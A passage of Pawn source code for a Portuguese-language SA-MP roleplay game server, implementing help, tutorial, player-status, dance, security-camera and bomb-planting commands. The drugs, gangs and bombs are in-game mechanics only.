	        SendClientMessage(playerid, COLOUR_LIGHT_BLUE, "Virtual Society RPG - Novidades - Parte III - Chat:");
	        SendClientMessage(playerid, COLOUR_WHITE, "As mensagens digitadas no chat irão ser exibidas apenas para jogadores próximos a você, mas");
	        SendClientMessage(playerid, COLOUR_WHITE, "você pode usar o chat global (/g [texto]), usar o chat de veículo (/c [texto]) e além");
	        SendClientMessage(playerid, COLOUR_WHITE, "disso usar o celular (/celular [comando]) para falar com jogadores longe de forma privada e");
	        SendClientMessage(playerid, COLOUR_WHITE, "além disso poderá enviar mensagens para jogadores que não estiverem conectados.");
	        SendClientMessage(playerid, COLOUR_WHITE, "Há disponível também walk-talkies (/walktalkie [comando]) para falar com jogadores sintonizados");
            SendClientMessage(playerid, COLOUR_WHITE, "na mesma frequência em um determinado raio (para adquirir celular e walk-talkie vá para a 24/7).");
			SendClientMessage(playerid, COLOUR_WHITE, "Caso queira contatar a administração, use o chat de administrador (/a [texto]), mas use apenas");
            SendClientMessage(playerid, COLOUR_WHITE, "em casos necessários, como reportar problemas ou pedir ajuda.");
			return 1;
	    }

	    if(n == 4)
	    {
	        SendClientMessage(playerid, COLOUR_LIGHT_BLUE, "Virtual Society RPG - Novidades - Parte IV - Empresas:");
	        SendClientMessage(playerid, COLOUR_WHITE, "Você também poderá adquirir empresas, contratar funcionários, definir salário, recompensas, contratar");
	        SendClientMessage(playerid, COLOUR_WHITE, "sócios, definir suas porcentagens, investir nelas ou também trabalhar em uma, pedindo para ser contratado.");
            SendClientMessage(playerid, COLOUR_WHITE, "Para adquirir uma empresa vá até ela, confira o valor e use /empresa [comprar]");
            SendClientMessage(playerid, COLOUR_WHITE, "Você poderá apenas contratar funcionários do mesmo ramo da empresa.");
            SendClientMessage(playerid, COLOUR_WHITE, "Os resultados (lucro, prejuízo) saem uma vez por semana, fique atento!");
			return 1;
	    }

	    if(n == 5)
	    {
	        SendClientMessage(playerid, COLOUR_LIGHT_BLUE, "Virtual Society RPG - Novidades - Parte V - Gangues:");
	        SendClientMessage(playerid, COLOUR_WHITE, "A disputa por territórios é grande, caso queira participar, crie sua própria gangue e ataque");
	        SendClientMessage(playerid, COLOUR_WHITE, "outros territórios (/gangue [comandos]), chame pessoas para sua gangue, defina seus cargos,");
	        SendClientMessage(playerid, COLOUR_WHITE, "você poderá conquistar um território após criar a gangue, os outros terá que conseguir atacando");
         	SendClientMessage(playerid, COLOUR_WHITE, "os de outras gangues, lembrando: a polícia poderá interferir e tirar todas as gangues deles.");
			return 1;
	    }

	    if(n == 6)
	    {
	        SendClientMessage(playerid, COLOUR_LIGHT_BLUE, "Virtual Society RPG - Novidades - Parte VI - Veículos:");
	        SendClientMessage(playerid, COLOUR_WHITE, "Adquira seu veículo e deixe-o do jeito que você o quer, aqui você poderá pintá-lo e modificá-lo.");
	        SendClientMessage(playerid, COLOUR_WHITE, "Claro, você não vai querer ele na mão de estranhos, por isso instale travas.");
	        SendClientMessage(playerid, COLOUR_WHITE, "Você pode definir aonde quer que ele fique, use /veiculo [estacionar]");
	        SendClientMessage(playerid, COLOUR_WHITE, "Não esqueça das licensas, vá até as auto-escolas para realizar os testes de habilitação e adquiri-las.");
         	SendClientMessage(playerid, COLOUR_WHITE, "Para adquirir veículos vá nas concessionárias, há uma para cada tipo (terrestre, aéreo e náutico)");
         	SendClientMessage(playerid, COLOUR_WHITE, "escolha seu veículo, chegue perto e digite /veiculo [comprar]");
			return 1;
	    }

	    if(n == 7)
	    {
	        SendClientMessage(playerid, COLOUR_LIGHT_BLUE, "Virtual Society RPG - Novidades - Parte VII - Imóveis:");
	        SendClientMessage(playerid, COLOUR_WHITE, "Compre a casa dos seus sonhos, com o interior que você sempre quis, para isso você deverá");
	        SendClientMessage(playerid, COLOUR_WHITE, "achá-la à venda, é claro, e em seguida usar /casa [comprar]");
	        SendClientMessage(playerid, COLOUR_WHITE, "Você poderá ver o que está havendo próximo a sua casa sem sair dela (/janela)");
         	SendClientMessage(playerid, COLOUR_WHITE, "Além disso, poderá alugar para outra pessoa, e ganhar por isso.");
         	SendClientMessage(playerid, COLOUR_WHITE, "Para usar os comandos relacionados à casa use: /casa [comando]");
			return 1;
	    }
	    
	    if(n == 8)
	    {
	        SendClientMessage(playerid, COLOUR_LIGHT_BLUE, "Virtual Society RPG - Novidades - Parte VIII - Submissões:");
	        SendClientMessage(playerid, COLOUR_WHITE, "As submissões são trabalhos/bicos que você pode fazer para ganhar um dinheirinho extra,");
	        SendClientMessage(playerid, COLOUR_WHITE, "apesar de não ganhar experiência e ganhar menos dinheiro do que sua profissão, é sempre");
	        SendClientMessage(playerid, COLOUR_WHITE, "bom dar uma variada, não é? Como por exemplo ser DJ da discoteca, entregar sorvetes (Hummmm!)...");
         	SendClientMessage(playerid, COLOUR_WHITE, "Para iniciar uma submissão, vá até o local da mesma e digite /submissao");
         	SendClientMessage(playerid, COLOUR_WHITE, "Veja as submissões disponíveis com /submissoes");
			return 1;
	    }
	    
	    if(n == 9)
	    {
	        SendClientMessage(playerid, COLOUR_LIGHT_BLUE, "Virtual Society RPG - Novidades - Parte IV - Acessórios:");
	        SendClientMessage(playerid, COLOUR_WHITE, "Que tal criar o seu próprio estilo? Colocar um óculos maneiro no rosto, uma guitarra nas costas \\m/,");
            SendClientMessage(playerid, COLOUR_WHITE, "usar um boné, cata-ovo, uma cabeça de fantasia de galinha (ok, talvez seja exagero)...");
            SendClientMessage(playerid, COLOUR_WHITE, "Aqui você pode! Basta ir à uma loja de roupas e digite /acessorios [tipo] , os tipos são: oculos,");
            SendClientMessage(playerid, COLOUR_WHITE, "guitarras e chapeus, caso não fique bem, você poderá vender na loja (/acessorio [vender]) e ser");
            SendClientMessage(playerid, COLOUR_WHITE, "totalmente reembolsado (avisando desde já que nem todos os acessórios podem funcionar corretamente, irá");
            SendClientMessage(playerid, COLOUR_WHITE, "depender da skin/roupa que estiver usando). Você ainda poderá esconder/mostrar (/acessorio [esconder/usar])");
            SendClientMessage(playerid, COLOUR_WHITE, "e remover (/acessorio [remover] , não será reembolsado, mas não precisará estar na loja de roupas).");
			return 1;
	    }

	    SendClientMessage(playerid, COLOUR_LIGHT_BLUE, "Virtual Society RPG - Novidades:");
	    SendClientMessage(playerid, COLOUR_WHITE, "Seja bem-vindo ao Virtual Society RPG Server, um servidor com várias novidades com");
	    SendClientMessage(playerid, COLOUR_WHITE, "objetivo de proporcionar diversão à vários jogadores, confira algumas dessas novidades");
	    SendClientMessage(playerid, COLOUR_WHITE, "pelo servidor ou digite /novidades [lista]");
	    SendClientMessage(playerid, COLOUR_WHITE, "Esperamos que divirta-se e jogue limpo, sem uso de cheats, hacks e/ou coisas do gênero.");
	    return 1;
	}
	
	if(strcmp(cmd, "/tutorial", true) == 0)
	{
	    new item[128];
	    
	    item = strtok(cmdtext, idx);
	    
	    if(!strlen(item))
	    {
	        SendClientMessage(playerid, COLOUR_LIGHT_BLUE, "Virtual Society RPG - Tutorial:");
	        SendClientMessage(playerid, COLOUR_WHITE, "Seja bem-vindo! No Virtual Society RPG, você pode arranjar empregos, ter casas,");
	        SendClientMessage(playerid, COLOUR_WHITE, "ter veículos, participar de gangues, administrar empresas, etc...");
	        SendClientMessage(playerid, COLOUR_WHITE, "Utilize o /gps (/gps [local]) para encontrar os lugares que não souber onde ficam.");
	        SendClientMessage(playerid, COLOUR_WHITE, "Cada item tem seu próprio tutorial, para vê-lo, digite /tutorial [item]");
	        SendClientMessage(playerid, COLOUR_WHITE, "Itens disponíveis: chat, empregos, casas, veiculos, gangues, empresas, submissoes");
	        SendClientMessage(playerid, COLOUR_WHITE, "Veja também: /novidades");
	        SendClientMessage(playerid, COLOUR_WHITE, "Para ver os comandos principais do servidor digite /ajuda");
			SendClientMessage(playerid, COLOUR_WHITE, "Para ver as teclas usadas no servidor digite /teclas");
	        return 1;
	    }
	    
	    if(strcmp(item, "chat", true) == 0)
	    {
	        SendClientMessage(playerid, COLOUR_LIGHT_BLUE, "Virtual Society RPG - Chat:");
	        SendClientMessage(playerid, COLOUR_WHITE, "O sistema de chat é bastante dinâmico, falando normal, apenas os jogadores próximos");
	        SendClientMessage(playerid, COLOUR_WHITE, "irão te ouvir, você também poderá usar o chat global (/g [texto]), falar apenas para");
	        SendClientMessage(playerid, COLOUR_WHITE, "os jogadores que estão no seu veículo (/c [texto]), no rádio da sua profissão (/r [texto]),");
	        SendClientMessage(playerid, COLOUR_WHITE, "e se comunicar com os administradores sobre o servidor (/a [texto]).");
	        SendClientMessage(playerid, COLOUR_WHITE, "Além disso, você poderá obter um Walk-Talkie na 24/7, e falar para pessoas sintonizadas na");
	        SendClientMessage(playerid, COLOUR_WHITE, "mesma estação que você, num certo raio de distância. Outro item importante é o celular, você");
	        SendClientMessage(playerid, COLOUR_WHITE, "poderá ligar para outros jogadores, enviar sms, adicionar contatos, mas é claro, terá que");
	        SendClientMessage(playerid, COLOUR_WHITE, "comprar créditos para usá-lo (também na 24/7).");
	    }
	    
	    else if(strcmp(item, "empregos", true) == 0)
	    {
	        SendClientMessage(playerid, COLOUR_LIGHT_BLUE, "Virtual Society RPG - Empregos:");
	        SendClientMessage(playerid, COLOUR_WHITE, "Prover o sustento é essencial, para isso, você deverá ir na empresa do emprego que deseja");
	        SendClientMessage(playerid, COLOUR_WHITE, "e assinar um contrato (/assinar), lembrando: algumas profissões requerem habilidades como");
	        SendClientMessage(playerid, COLOUR_WHITE, "habilitação terrestre (Taxista, Pizzaboy, Maquinista), habilitação naútica (Pescador), etc...");
	        SendClientMessage(playerid, COLOUR_WHITE, "Além de também precisarem de uma mínima quantidade de Level (/status [profissional]).");
	        SendClientMessage(playerid, COLOUR_WHITE, "Para adquirir um Level, você deverá conseguir 7 Xpoints, trabalhando nas profissões que");
	        SendClientMessage(playerid, COLOUR_WHITE, "você já puder pegar, submissões não lhe darão Xpoints, nem Level.");
	    }
	    
	    else if(strcmp(item, "casas", true) == 0)
	    {
            SendClientMessage(playerid, COLOUR_LIGHT_BLUE, "Virtual Society RPG - Casas:");
            SendClientMessage(playerid, COLOUR_WHITE, "Adquirir casas por aqui não tem segredo, apenas vá nas casas a venda e compre (/casa [comprar])");
            SendClientMessage(playerid, COLOUR_WHITE, "Você poderá ter mais de uma casa, e escolher em qual quer nascer (/casa [nascer]), alugar uma");
            SendClientMessage(playerid, COLOUR_WHITE, "para outros jogadores (/casa [alugar]), além de ter acesso ao seu interior, também poderá ver");
            SendClientMessage(playerid, COLOUR_WHITE, "através da janela (/janela).");
            SendClientMessage(playerid, COLOUR_WHITE, "Enquanto não tiver dinheiro para casa, poderá se hospedar no Virtual Hotel (/gps Virtual Hotel),");
            SendClientMessage(playerid, COLOUR_WHITE, "o quão legal é morar junto com vários outros jogadores, e ainda ter um restaurante na entrada?!");
	    }
	    
	    else if(strcmp(item, "veiculos", true) == 0)
	    {
            SendClientMessage(playerid, COLOUR_LIGHT_BLUE, "Virtual Society RPG - Veículos:");
            SendClientMessage(playerid, COLOUR_WHITE, "Veículos? Claro, não poderia faltar, né?! Aqui os veículos se dividem em 3 tipos: Terrestres,");
            SendClientMessage(playerid, COLOUR_WHITE, "Aéreos e Naúticos, cada um possui a sua auto escola, a sua concessionária (/gps), e o seu local");
            SendClientMessage(playerid, COLOUR_WHITE, "local de abastecimento (Posto, Aeroporto e Cooperativa de Pesca, respectivamente).");
            SendClientMessage(playerid, COLOUR_WHITE, "Além disso, é possível você customizar seu veículo ao máximo, poderá pintar, consertar e modificar");
            SendClientMessage(playerid, COLOUR_WHITE, "a placa (em alguma oficina ou com algum mecânico), e adicionar componentes/tuning na Virtual Shop");
            SendClientMessage(playerid, COLOUR_WHITE, "(/gps Virtual Shop), além, é claro, de poder estacionar onde quiser, mas cuidado com o local ou");
            SendClientMessage(playerid, COLOUR_WHITE, "poderá ser multado, as multas podem ser pessoais ou veiculares, pague-as na Delegacia.");
            SendClientMessage(playerid, COLOUR_WHITE, "Fique atento aos radares também, você pode vê-los através do mapa (ícones de bandeira)");
	    }
	    
	    else if(strcmp(item, "gangues", true) == 0)
	    {
            SendClientMessage(playerid, COLOUR_LIGHT_BLUE, "Virtual Society RPG - Gangues:");
            SendClientMessage(playerid, COLOUR_WHITE, "Você poderá criar sua própria gangue (/gangue [criar]) ou entrar para a de outro jogador através");
            SendClientMessage(playerid, COLOUR_WHITE, "de um convite (/gangue [convidar]), cada membro tem seu cargo, ou seja, sua função na gangue.");
            SendClientMessage(playerid, COLOUR_WHITE, "Você poderá conquistar territórios sem dono (/gangue [conquistar]), e atacar o de outras gangues,");
            SendClientMessage(playerid, COLOUR_WHITE, "mas caso a policia se meter e ganhar a guerra, o território passará a não ter mais dono.");
            SendClientMessage(playerid, COLOUR_WHITE, "Para ver os membros da sua gangue digite /gangue [membros]");
	    }
	    
	    else if(strcmp(item, "empresas", true) == 0)
	    {
            SendClientMessage(playerid, COLOUR_LIGHT_BLUE, "Virtual Society RPG - Empresas:");
            SendClientMessage(playerid, COLOUR_WHITE, "Aqui você poderá ter seu próprio negócio, adquirir empresas privadas (/empresa [comprar]),");
            SendClientMessage(playerid, COLOUR_WHITE, "poderá contratar sócios, definindo sua porcentagem de ganho na empresa, e funcionários,");
            SendClientMessage(playerid, COLOUR_WHITE, "definindo seu salário e suas recompensas por trabalhos, além de poder investir no seu");
            SendClientMessage(playerid, COLOUR_WHITE, "negócio, os resultados saem a cada semana.");
            SendClientMessage(playerid, COLOUR_WHITE, "Caso seja sócio ou funcionário e não estiver satisfeito, você pode se demitir (/empresa [demitirme])");
	    }
	    
	    else if(strcmp(item, "submissoes", true) == 0)
	    {
            SendClientMessage(playerid, COLOUR_LIGHT_BLUE, "Virtual Society RPG - Submissões:");
            SendClientMessage(playerid, COLOUR_WHITE, "Precisando de uma graninha extra? Faça submissões/bicos, para dar aquela descontraída do seu");
            SendClientMessage(playerid, COLOUR_WHITE, "emprego chato, seja DJ (Woohooo!), entregue sorvetes (Hmmmm!), transporte corpos (WTF?), conserte");
            SendClientMessage(playerid, COLOUR_WHITE, "postes de eletricidade (-.-'), entregue drogas e descarregue caminhões de cimento, já entendeu, né?");
            SendClientMessage(playerid, COLOUR_WHITE, "Veja as submissões com /submissoes , vá até o local e para aceitar a submissão use /submissao");
            SendClientMessage(playerid, COLOUR_WHITE, "Lembrando: Você não ganhará Xpoints nem Level por fazer submissões!");
	    }
	    
	    else
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "USO: /tutorial [item] - ITENS DISPONÍVEIS:");
	        SendClientMessage(playerid, COLOUR_GRAY, "chat, empregos, casas, veiculos, gangues, empresas, submissoes");
	    }
	    
	    return 1;
	}
	
	if(strcmp(cmd, "/submissoes", true) == 0)
	{
	    SendClientMessage(playerid, COLOUR_WHITE, "Virtual Society RPG - Submissões:");
	    SendClientMessage(playerid, COLOUR_ICE_CREAM, "Sorveteiro - Entrega de sorvetes (Local: Sorveteria)");
	    SendClientMessage(playerid, COLOUR_DRUGS, "Drugboy - Entrega de drogas (Local: Laboratorio de Drogas)");
	    SendClientMessage(playerid, COLOUR_DJ, "DJ - Selecionar composições (Local: Discoteca/Baile Funk)");
	    SendClientMessage(playerid, COLOUR_IML, "Motorista Funerário - Transportar corpos (Local: IML)");
	    SendClientMessage(playerid, COLOUR_CEMENT, "Cementboy - Transportar cimento (Local: Cimentaria)");
	    SendClientMessage(playerid, COLOUR_POST, "Eletricista - Consertar postes de luz (Local: Companhia Eletrica)");
	    return 1;
	}
	
	if(strcmp(cmd, "/status", true) == 0)
	{
	    new category[128], string[128], xpath[128], kpath[128];
	    
	    xpath = GetPlayerXFilePath(playerid);
	    kpath = GetPlayerKFilePath(playerid);
	    category = strtok(cmdtext, idx);
	    
		if(strlen(category) > 0)
		{
		    if(strcmp(category, "geral", true) == 0)
		    {
				new time[64], gpath[128];
				new counter, hour, mins, date, day, month, year, gang, post;
				
				counter = GetPlayerCounter(playerid, COUNTER_CONNECTED);
				mins = counter % 60;
				hour = counter / 60;

				format(time, sizeof time, "%dmins", mins);
				
				if(hour > 0)
				    format(time, sizeof time, "%dhrs %s", hour, time);
				
				GetPlayerGangData(playerid, gang, post);
				gpath = GetGangFilePath(gang);
				date = hGetInt(kpath, "Last");
				day = date & 0xFF;
				month = (date >> 8) & 0xFF;
				year = (date >> 16) & 0xFFFF;
				
                format(string, sizeof string, "[----------] %s -> Status Geral [----------]", PlayerName(playerid));
				SendClientMessage(playerid, COLOUR_RED, string);
				format(string, sizeof string, "Tempo Conectado: %s <> Ultima Entrada: %s", time, ToDate(day, month, year));
				SendClientMessage(playerid, COLOUR_WHITE, string);
				format(string, sizeof string, "Gangue: %s <> Cargo: %s", hGetString(gpath, "Name"), GangPosts[post]);
				SendClientMessage(playerid, COLOUR_WHITE, string);
				return 1;
		    }
		    
		    else if(strcmp(category, "pessoal", true) == 0)
		    {
				new drunk[64], drug[64];
				new dcounter;
				
				dcounter = GetPlayerCounter(playerid, COUNTER_DRUG);
				
				if(dcounter <= 0)
				    drug = ("Nenhuma");
				    
				else if(dcounter > 15)
				    drug = ("Baixa");
				    
				else if(dcounter > 10)
				    drug = ("Média");

				else
				    drug = ("Alta");
				    
				if(pDrunk[playerid] < 2200)
				    drunk = ("Zerado");
				    
				else if(pDrunk[playerid] < 8000)
				    drunk = ("Baixo");
				    
				else if(pDrunk[playerid] < 20000)
				    drunk = ("Médio");
				    
				else if(pDrunk[playerid] < 40000)
				    drunk = ("Alto");
				    
				else
				    drunk = ("Muito Alto");
				    
		        format(string, sizeof string, "[----------] %s -> Status Pessoal [----------]", PlayerName(playerid));
				SendClientMessage(playerid, COLOUR_RED, string);
				format(string, sizeof string, "Skin: %d <> Teor Alcóolico: %s <> Dependência Química: %s", hGetInt(xpath, "Skin"), drunk, drug);
				SendClientMessage(playerid, COLOUR_WHITE, string);
				format(string, sizeof string, "Nível de Procurado: %d <> Preso: %s", hGetInt(xpath, "WantedLevel"), (hGetInt(xpath, "BustedTime") > 0) ? ("Sim") : ("Não"));
                SendClientMessage(playerid, COLOUR_WHITE, string);
				return 1;
		    }
		    
            else if(strcmp(category, "profissional", true) == 0)
		    {
		        new cpath[128], ownprops[128], com[64], postname[64], rwd[64];
		        new company, post, reward, payday, jobid, counter, jobcounter, levelcounter;
		        
		        jobid = hGetInt(xpath, "Job");
		        jobcounter = GetPlayerCounter(playerid, COUNTER_JOB);
				levelcounter = GetPlayerCounter(playerid, COUNTER_LEVEL);
		        GetPlayerCompanyData(playerid, company, post, reward, payday);

				if(company == 0)
				{
				    com = ("Nenhuma");
				    postname = ("Nenhum");
				    payday = Jobs[jobid][jobPayday];
				    rwd = ("Indefinida");
				}
				
				else
				{
				    format(com, sizeof com, "%s \"%s\"", Companies[company][cType], Companies[company][cName]);

					if(post == COMPANY_POST_EMPLOYEE)
					    postname = ("Funcionário");

					if(post == COMPANY_POST_PARTNER)
					    postname = ("Sócio");
					    
					format(rwd, sizeof rwd, "$%d,00 dólares", reward);
				}
				
                format(string, sizeof string, "[----------] %s -> Status Profissional [----------]", PlayerName(playerid));
				SendClientMessage(playerid, COLOUR_RED, string);
				format(string, sizeof string, "Emprego: %s <> Level: %d <> Xpoints: %d <> Empresa: %s <> Cargo: %s", Jobs[jobid][jobName], hGetInt(xpath, "Level"), hGetInt(xpath, "Xpoints"), com, postname);
                SendClientMessage(playerid, COLOUR_WHITE, string);
                format(string, sizeof string, "Tempo de Contrato restante (mins): %d <> Tempo de Xpoint restante (mins): %d", jobcounter, levelcounter);
                SendClientMessage(playerid, COLOUR_WHITE, string);
                format(string, sizeof string, "Salário: $%d,00 dólares <> Recompensa: %s", payday, rwd);
                SendClientMessage(playerid, COLOUR_WHITE, string);
                
                ownprops = ("Nenhuma");
                counter = 0;
                
                for(new c = 1; c < sizeof Companies; c++)
                {
                    new owner[128];
                    
					cpath = GetCompanyFilePath(c);
					owner = hGetString(cpath, "Owner");
					
					if(strlen(owner) > 0 && strcmp(PlayerName(playerid), owner, true) == 0)
					{
						if(counter == 0)
						    format(ownprops, sizeof ownprops, "%s", Companies[c][cType]);
						    
						else
						    format(ownprops, sizeof ownprops, "%s, %s", ownprops, Companies[c][cType]);
						
					    counter++;
					}
                }
                
                format(string, sizeof string, "Empresas em seu nome [%d]: %s", counter, ownprops);
                SendClientMessage(playerid, COLOUR_WHITE, string);
                return 1;
		    }
		    
		    else if(strcmp(category, "pertences", true) == 0)
		    {
		        new vhpath[128], house[64], name[MAX_PLAYER_NAME];
		        new vcounter, hcounter, houseid, itens;
		        
		        vcounter = hcounter = 0;
		        GetPlayerName(playerid, name, sizeof name);
		        
		        for(new v = MaxServerVeh; v < GetVehicles(); v++)
				{
				    vhpath = GetVehicleFilePath(v);
				    
				    if(strlen(vhpath) > 0 && strcmp(name, hGetString(vhpath, "Owner"), true) == 0)
				        vcounter++;
				}
		        
		        for(new h = 0; h < GetHouses(); h++)
				{
 					vhpath = GetHouseFilePath(h);

					if(strlen(vhpath) > 0 && strcmp(name, hGetString(vhpath, "Owner"), true) == 0)
				        hcounter++;
				}
	
	            houseid = hGetInt(xpath, "House");
	            
	            if(houseid == -1)
	                house = ("Nenhuma");
	                
				else
				    format(house, sizeof house, "Casa N°%d", house);
				    
				itens = hGetInt(xpath, "Itens");
				
                format(string, sizeof string, "[----------] %s -> Pertences [----------]", PlayerName(playerid));
				SendClientMessage(playerid, COLOUR_RED, string);
				format(string, sizeof string, "Multas avaliadas em: $%d,00 dólares", hGetInt(xpath, "Fine"));
				SendClientMessage(playerid, COLOUR_WHITE, string);
				format(string, sizeof string, "Casa Atual: %s <> Hotel: %s", house, (hGetInt(xpath, "Hotel") == 1) ? ("Sim") : ("Não"));
				SendClientMessage(playerid, COLOUR_WHITE, string);
				format(string, sizeof string, "Veículos em seu nome: %d <> Casas em seu nome: %d", vcounter, hcounter);
				SendClientMessage(playerid, COLOUR_WHITE, string);
				format(string, sizeof string, "Brinquedo: %s <> Walk-Talkie: %s", (hGetInt(xpath, "Toys") != 0) ? ("Sim") : ("Não"), (itens & ITEM_WALKTALKIE) ? ("Sim") : ("Não"));
				SendClientMessage(playerid, COLOUR_WHITE, string);
				return 1;
		    }
		}
		
		SendClientMessage(playerid, COLOUR_GRAY, "USO: /status [categoria] - CATEGORIAS DISPONÍVEIS:");
		SendClientMessage(playerid, COLOUR_GRAY, "geral, pessoal, profissional, pertences");
		return 1;
	}
	
	if(strcmp(cmd, "/dancar", true) == 0 && idle)
	{
		new dance_style;

		if(IsPlayerInAnyVehicle(playerid))
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você não pode dançar dentro de um veículo.");
		    return 1;
		}
		
		dance_style = strval(strtok(cmdtext, idx));

	    if(dance_style == 1)
	        SetPlayerSpecialAction(playerid, SPECIAL_ACTION_DANCE1);
	        
       	else if(dance_style == 2)
    	    SetPlayerSpecialAction(playerid, SPECIAL_ACTION_DANCE2);
    	    
       	else if(dance_style == 3)
			SetPlayerSpecialAction(playerid, SPECIAL_ACTION_DANCE3);
			
    	else if(dance_style == 4)
	        SetPlayerSpecialAction(playerid, SPECIAL_ACTION_DANCE4);
	        
		else if(dance_style == 5)
		{
	        TogglePlayerControllable(playerid, false);
	   		ApplyAnimation(playerid, "DANCING", "dnce_M_d", 4.1, 1, 1, 1, 1, -1, 1);
	   		KeyEvent[playerid] |= KEY_EVENT_DANCING;
	   		DanceStyle[playerid] = 0;
	   		DrawTextForPlayer(playerid, "Pressione ~g~~k~~VEHICLE_ENTER_EXIT~ ~w~para parar de dançar.", COLOUR_WHITE, TEXTDRAW_STYLE_4, 5000);
		}
		
		else if(dance_style == 6)
		{
	        TogglePlayerControllable(playerid, false);
		    ApplyAnimation(playerid, "STRIP", "STR_Loop_A", 4.1, 1, 1, 1, 1, -1, 1);
		    KeyEvent[playerid] |= KEY_EVENT_STRIPPING;
	   		DrawTextForPlayer(playerid, "Pressione ~g~~k~~VEHICLE_ENTER_EXIT~ ~w~para parar de dançar.", COLOUR_WHITE, TEXTDRAW_STYLE_4, 5000);
		}
		
		else
		    SendClientMessage(playerid, COLOUR_GRAY, "USO: /dancar [1-6]");
		
		return 1;
	}
	
	if(strcmp(cmd, "/renderse", true) == 0 && idle)
	{
		SetPlayerSpecialAction(playerid, SPECIAL_ACTION_HANDSUP);
		return 1;
	}

	if(strcmp(cmd, "/continuar", true) == 0)
	{
		new xpath[128], lastpos[128];
		new int, enter, house;
		new Float:X, Float:Y, Float:Z, Float:A;
		
		xpath = GetPlayerXFilePath(playerid);
		lastpos = hGetString(xpath, "LastPos");
		
		if(!strlen(lastpos))
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você não pode continuar de onde parou.");
			return 1;
		}
		
		idx = 0;
		X = floatstr(strtok(lastpos, idx, ','));
		Y = floatstr(strtok(lastpos, idx, ','));
		Z = floatstr(strtok(lastpos, idx, ','));
		A = floatstr(strtok(lastpos, idx, ','));
		int = strval(strtok(lastpos, idx, ','));
		enter = strval(strtok(lastpos, idx, ','));
		house = strval(strtok(lastpos, idx, ','));
		
		DeleteTimer(ContinueTimer[playerid]);
		hUnset(xpath, "LastPos");
		Enter[playerid] = enter;
		House[playerid] = house;
		Door[playerid] = -1;
		SetPlayerInterior(playerid, int);
		SetPlayerPos(playerid, X, Y, Z);
		SetPlayerFacingAngle(playerid, A);
	    return 1;
	}
	
	if(strcmp(cmd, "/camera", true) == 0)
	{
		new tmp[128];
		new camid;
		new Float:RX, Float:RY, Float:RZ;
		
		tmp = strtok(cmdtext, idx);
		camid = -1;
		
		if(strlen(tmp) > 0)
		{
		    for(new sec = 0; sec < sizeof SecurityCameras; sec++)
		    {
		        if(strcmp(SecurityCameras[sec][secLocal], tmp, true) == 0)
		        {
		            camid = sec;
		            break;
		        }
		    }
		}
		
		if(camid == -1)
		{
		    if(SecCamera[playerid] != -1)
		    {
		        SecCamera[playerid] = -1;
		        KeyEvent[playerid] &= ~KEY_EVENT_CAMERA;
		        SetPlayerInterior(playerid, 6);
		        SetPlayerPos(playerid, 233.8646, 77.7175, 1005.0390);
		        SetPlayerFacingAngle(playerid, 7.2952);
		        SetCameraBehindPlayer(playerid);
		        HideTextLightGray(playerid);
		        TogglePlayerControllable(playerid, true);
		        return 1;
		    }
		    
		    SendClientMessage(playerid, COLOUR_GRAY, "USO: /camera [local] - LOCAIS DISPONÍVEIS:");
		    SendClientMessage(playerid, COLOUR_GRAY, "Boate, Bar, Posto, Discoteca, Banco, Delegacia, Ammu-Nation, Pizzaria");
		    return 1;
		}

		if(SecCamera[playerid] == -1)
		{
		    new Float:X, Float:Y, Float:Z;
		    
		    GetPlayerPos(playerid, X, Y, Z);
		    
		    if(GetDistance(X, Y, Z, 233.8646, 77.7175, 1005.0390) > 10.0 || GetPlayerInterior(playerid) != 6)
		    {
		    	SendClientMessage(playerid, COLOUR_GRAY, "Você não está na sala de computação.");
		    	return 1;
			}
			
			if(!IsPlayerCop(playerid))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Você não tem autorização para ver as câmeras de segurança.");
		    	return 1;
			}
		}
		
		if(SecCamera[playerid] == camid)
			return 1;
				
		for(new n = 0; n < MAX_SLOTS; n++)
		{
		    if(IsPlayerConnected(n) && IsPlayerLogged(n) && SecCamera[n] == camid)
		    {
		        SendClientMessage(playerid, COLOUR_GRAY, "Essa câmera de segurança já está sendo monitorada por outro jogador.");
		        return 1;
		    }
		}
		
		SecCamera[playerid] = camid;
		KeyEvent[playerid] |= KEY_EVENT_CAMERA;
		TogglePlayerControllable(playerid, false);
		ShowTextLightGray(playerid);
		GetObjectRot(SecurityCameras[camid][secObjectId], RX, RY, RZ);
		SetPlayerPos(playerid, SecurityCameras[camid][secX], SecurityCameras[camid][secY], SecurityCameras[camid][secZ] - 70.0);
		SetPlayerInterior(playerid, 0);
		SetPlayerCameraPos(playerid, SecurityCameras[camid][secX], SecurityCameras[camid][secY], SecurityCameras[camid][secZ]);
		SetPlayerCameraLookAt(playerid, SecurityCameras[camid][secX] + 50.0 * floatsin(-RZ, degrees), SecurityCameras[camid][secY] + 50.0 * floatcos(-RZ, degrees), SecurityCameras[camid][secZ] - 20.0);
		SendClientMessage(playerid, COLOUR_SWAT, "Para parar digite /camera");
		return 1;
	}
	
	if(strcmp(cmd, "/plantar", true) == 0)
	{
	    new exp[128];
	    new obj;
		new Float:X, Float:Y, Float:Z, Float:A;
	    
	    exp = strtok(cmdtext, idx);
	    
		if(strlen(exp) > 0)
		{
		    GetPlayerPos(playerid, X, Y, Z);
		    GetPlayerFacingAngle(playerid, A);
		    
		    X += 0.5 * floatsin(-A, degrees);
		    Y += 0.5 * floatcos(-A, degrees);
		    Z -= 0.94;
		    
		    if(strcmp(exp, "bomba-relogio", true) == 0)
		    {
		        new seconds;

				seconds = strval(strtok(cmdtext, idx));
				
		        if(seconds < 15 || seconds > 90)
		        {
		            SendClientMessage(playerid, COLOUR_GRAY, "USO: /plantar bomba-relogio [15~90 segundos]");
		            return 1;
		        }
		        
		        if(GetPlayerExplosive(playerid, 0) == 0)
		        {
		            SendClientMessage(playerid, COLOUR_GRAY, "Você não possui uma bomba relogio.");
					return 1;
		        }
		        
		        TakePlayerExplosive(playerid, 0);
		        ApplyAnimation(playerid, "BOMBER", "BOM_Plant", 4.0, 0, 0, 0, 0, 0, 1);
		        obj = CreateObject(1252, X, Y, Z, 90.0, 90.0, A);
		        SetTimerEx("ExplodeBomb", seconds * 1000, false, "dfff", obj, X, Y, Z);
		        SendClientMessage(playerid, COLOUR_RED, "The bomb has been planted!");
		        return 1;
		    }
		    
		    if(strcmp(exp, "bomba-aprox", true) == 0)
		    {
		        if(GetPlayerExplosive(playerid, 1) == 0)
		        {
